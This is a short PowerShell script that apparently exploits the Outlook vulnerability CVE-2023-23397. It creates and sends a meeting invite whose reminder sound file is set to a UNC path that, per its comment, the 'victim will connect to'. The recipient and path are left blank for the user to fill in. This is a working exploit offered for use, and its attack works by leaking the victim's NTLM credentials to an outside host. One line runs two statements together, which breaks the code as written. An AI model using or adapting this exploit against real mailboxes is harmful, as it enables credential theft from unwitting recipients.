$outlook = New-Object -ComObject Outlook.Application
$meeting = $outlook.CreateItem('olAppointmentItem')
$meeting.Subject = 'CVE-2023-23397 Test Alert'
$meeting.Body = 'It''s meeting time!'
$meeting.Location = 'Virtual'
$meeting.ReminderSet = $true
$meeting.Importance = 1
$meeting.MeetingStatus = [Microsoft.Office.Interop.Outlook.OlMeetingStatus]::olMeeting
$meeting.ReminderMinutesBeforeStart = 15$meeting.Start = [datetime]::Now
#Adjust things here
$meeting.Recipients.Add('') #Email to send invite to.
$meeting.ReminderSoundFile = "" #UNC path victim will connect to.
#Adjust things above here
$meeting.ReminderOverrideDefault = $true #Required
$meeting.ReminderPlaySound = $true #Required
$meeting.Duration = 30
$meeting.Send()
